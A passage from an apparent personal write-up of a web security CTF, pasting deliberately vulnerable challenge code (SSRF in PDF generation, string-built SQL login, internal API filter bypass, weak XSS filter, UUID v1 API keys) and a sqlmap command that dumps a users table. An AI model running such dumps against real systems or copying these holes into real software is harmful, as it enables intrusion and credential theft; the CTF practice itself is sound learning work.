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" alt="Authorized Signature" style="max-width: 200px;">
            </div>
        </body>
        </html>
    `
    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    await page.setRequestInterception(true);
    page.on('request', async (request) => {
        let result = await isUrlSafe(request.url())
        console.log('result: ' + result)
        if (result) {
            if (result == '169.254.169.254') {
                request.respond({status: 200, contentType: 'text/plain', body: 'WIZER{H0w_D1d_YOU_D0_Th4ttttt???}'});
            } else {
                request.continue();
            }
        } else {
            request.respond({status: 200, contentType: 'text/plain', body: 'This request either failed, or was blocked.'});        
        }
    });

    try {
        await page.setContent(data, {timeout: 5000}); // Set the content of the page to the HTML string
        await page.pdf({ path: 'certificate.pdf', format: 'A4' }); // Generate a PDF from the page content
        await browser.close();
        res.download('certificate.pdf', 'certificate.pdf');
    } catch (error) {
        res.json(error)
    }
});

// Check if the URL is safe
async function isUrlSafe(url) {
    try {
        await axios.get(url, {httpAgent: ssrfFilter(url), httpsAgent: ssrfFilter(url)});
    } catch (error) {
        console.log('BLOCKED: ' + url)
        return false; // Return false if there's an error making the request
    }
    
    let domain = new URL(url).hostname;

    if (domain) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        const addresses = await dns.promises.resolve4(domain);
        if (addresses) {
            console.log(addresses)
            return addresses[0];  
        }
    }
    return '0.0.0.0'
}

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
```
This one seems like a SSRF attack on PDF generation, but we need to bypass **isUrlSafe** function.
## CTF Challenge 
These are some of the challenges i had time to lookup, I find the way to solve 2 of 6.

### **Login as an Admin**

```javascript
import requestIp from 'request-ip';
import dotenv from 'dotenv';
import mysql from 'mysql2';
dotenv.config();

const getUser = async (userName, password) => {
    let connection = mysql.createConnection(process.env.DATABASE_URL);
    const query = `SELECT userName, password, type, firstName, lastName FROM users_table
                    WHERE userName = '${userName}' and password = '${password}'`;
    const [rows, fields] = await connection.promise().query(query);

    connection.end();
    return rows;
}

const login = async (userName, password) => {
    const rows = await getUser(userName, password);
    if(rows.length === 1 && password === rows[0].password) {
        rows[0].password = "[REDACTED]";
        return rows;
    }
    
    return [];
};
  
export default async (req, res) => {
    try {
        const result = await login(req.body.user, req.body.password);
        if(result.length > 0) {
            res.status(200).send(result);
        } else {
            res.status(401).send("Invalid username or password");
        }
    } catch (e) {
        res.status(500).send(e.message);
    }
};
```

Seems like and SQL inyection, we can confirm a blind time-based sql inyection 

![Timebases](image-7.png)

The key is the ``password === rows[0].password`` check. IF we can make this condition true, we can bypass the authentication process.
Let sqlmap dump the databases for us. 

```sh
sqlmap -r wizer-ctf-lab1.sql --force-ssl -batch --technique=T --dbms=mysql --ignore-code=401 --dump -D chal7 -T users_table -C userName,password
```

after some connecting issues, I finally get the password.

![ggSQLi](image-8.png)

### **Augustus Gloop's Secret**

```javascript
import express from 'express';
const app = express();
const app2 = express();
import bodyParser from 'body-parser';
app.use(bodyParser.json());
app2.use(bodyParser.json());
import requestIp from 'request-ip';
import dotenv from 'dotenv';
import { CRMEntities } from './crm.mjs';
import axios from 'axios';
import { MongoClient } from 'mongodb';
dotenv.config();
const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
const requireAuthentication = ['getuser', 'getcompany'];

app.post('/callApi', async (req, res) => {
    let json = req.body;
    let api = String(json.api)?.trim()?.toLowerCase().replaceAll('/', '').replaceAll('\\', '');
    let token = json.token;
    try {
        if (requireAuthentication.includes(api)) {
            if (token == process.env.tokenSecret) {
                console.log("authenticated api:", api);
                const response = await axios.post(`http://localhost:${process.env.internalPort}/${api}`, json);
                res.send(response.data);
            } else {
                res.send("Invalid token");
            }  
        } else {
            console.log("unauthenticated api:", api);
            const response = await axios.post(`http://localhost:${process.env.internalPort}/${api}`, json);
            res.send(response.data);
        }
    } catch(e) {
        res.status(500).end(e.message);
        console.error(e);
    }
});

app2.post('/getUser', async (req, res) => {
    const client = new MongoClient(process.env.MONGODB_URI);
    try {
        console.log("remote ip:" + requestIp.getClientIp(req));
        console.log("/users body ", req.body, typeof(req.body));

        const userId = req.body.userId;
        if(typeof(req.body) === 'object' && userId && userId.match(uuidFormat)) {
            await client.connect();
            const db = client.db("evenr2_2");
            const user = await db
                .collection("users")
                .find({ user_id: userId }) 
                .maxTimeMS(5000)
                .toArray()
            console.log(user);
            res.send(JSON.stringify(user));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    } finally {
        await client.close();
    }
})

app2.post('/getCompanies', async (req, res) => {
    const client = new MongoClient(process.env.MONGODB_URI);
    try {
        console.log("remote ip:" + requestIp.getClientIp(req));
        console.log("/companies body ", req.body, typeof(req.body));

        const companyId = req.body.companyId;
        if(typeof(req.body) === 'object' && companyId && companyId.match(uuidFormat)) {
            await client.connect();
            const db = client.db("evenr2_2");
            const company = await db
                .collection("companies")
                .find({ company_id: companyId })
                .maxTimeMS(5000)
                .toArray();
            console.log(company);
            res.send(JSON.stringify(company));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    } finally {
        await client.close();
    }
})

app2.post('/CRMEntities', async (req, res) => {
    res.send(CRMEntities);
})

app.listen(process.env.externalPort, () => {
    console.log(`External API listening on PORT ${process.env.externalPort}`)
})

// Internal service; accessible only from localhost
app2.listen(process.env.internalPort, 'localhost', function() {
    console.log(`Internal service started port ${process.env.internalPort}`);
});
```

The app2 just listen on localhost, and the app1 is the onlyone accesible from internet.
As unauthenticated users we can only reach de */CRMEntities* endpoint, we don't know the token, we have to bypass and reach to getUser endpoints, there i think there is some NoSQL inyection vulnerability. 
To bypass the ``requireAuthentication.includes(api)`` we use ``#`` character 

![bypass_filter](image-9.png)

Now we have to put the arguments 

![gg](image-10.png)

and we got it, thats two challenges in 3 hours, its no the top score but i enjoyed  a lot.

![gg](image-11.png)

### **Hack the Menu**

```javascript
import styles from '../styles/Inner.module.css'
import { useRouter } from 'next/router';
import React from 'react';
import Image from 'next/image'

const sanitizeLink = (directLink) => {
  // prevent XSS (replace case insensitive 'javascript' recursively in the URL)
  let searchMask = "javascript";
  let regEx = new RegExp(searchMask, "ig");
  
  while(directLink !== String(directLink).replace(regEx, '')) {
    directLink = String(directLink).replace(regEx, '');
  }
  return directLink;
}

export default function Home() {

  const router = useRouter();
  let { directLink } = router.query;
  const isDirectLink = typeof directLink === 'string' && directLink.length > 0; 
  React.useEffect(() => {
    if (router.isReady && isDirectLink) {
      directLink = sanitizeLink(directLink);
      router.push(directLink);
    }
  }, [router.isReady, isDirectLink]);

  return (
  ...
  )
}
```

XSS are not my strong, can bypass the filter ? How works react ? 

We need to add special characters to string 'javascript', I'am sure i try this but no luck 

### **Sensitive Flags**

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const uuid = require('uuid');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
const secretKey = crypto.randomBytes(64);
const flags = {
    'Belgium': 'black yellow red',
    'United States': 'red white blue',
    'France': 'blue white red',
    'United Kingdom': 'red white blue',
    'Germany': 'black red gold',
    'FLAG': process.env.FLAG
};
const users = {'admin': {'APIKey': uuid.v1()}};

app.use('/forbidden', (req, res) => {
  res.status(403).send('Forbidden access');
});

app.get('/getAPIKey', (req, res) => {
    // Step 2: Only send the result if the user is logged in
    const authHeader = req.headers.authorization || "No auth";
    const token = authHeader.split(' ')[1];
    result = {'APIKey': ''}
    jwt.verify(token, secretKey, (err, user) => {          
        if (err) { // If the token is not valid
            res.status(302);
            res.setHeader('Location', '/Forbidden');
        } else  { // If the token is valud
            result.APIKey = users[user.username]['APIKey'];
        }
        res.send(result);
    });
});

app.get('/createAPIKey', (req, res) => {
    if (req.query.sample) return res.json(uuid.v1());
    if (!users[req.query.username]) return res.json('That user does not exist');
    users[req.query.username]['APIKey'] = uuid.v1();
    return res.json(`Generated new API key for user ${req.query.username}`);
});

app.get('/flag', (req, res) => {
    // Step 1: Get the flag data but protected by the API key, our flag data is very sensitive!
    let result = 'No result yet'
    if (users[req.query.username] && req.query.apikey === users[req.query.username]['APIKey']) {
        result = flags[req.query.flag];
    }

    // Step 2: Only send the result if the user is logged in
    const authHeader = req.headers.authorization || "No auth";
    const token = authHeader.split(' ')[1];
    jwt.verify(token, secretKey, (err) => {          
        // If the token is not valid
        if (err) {
            res.status(302);
            res.setHeader("Location", "/Forbidden")
        }
        // If the token is valid
        res.send(result) 
    });
});

app.use(express.json());
app.post('/submit_flag', (req, res) => {
    if (process.env.FLAG === req.body.flag) {
        res.json('Congratulations! ' + process.env.FLAG)
    } else {
        res.json('Not quite correct!')
    }
})

app.listen(3000);
```
I can create an apikey sample and also reset the api for admin user
![sample](image-12.png)

In the /flag endpoint we see that if I we manage to pass a valid apikey at that moment for the admin user, we don't need a valid JWT Token, beacuse the result variale will have the flag and it will be printed in the 302 response as happend with /getAPIKey endpoint.

Thinks its a good time to practice Burp Macros, because to me its seem that we need to bruteforce the admin api key.

UUID v1 is generated by using a combination the host computers MAC address and the current date and time. This means you are guaranteed to get a completely unique ID, unless you generate it from the same computer, and at the exact same time.

![alt text](image-13.png)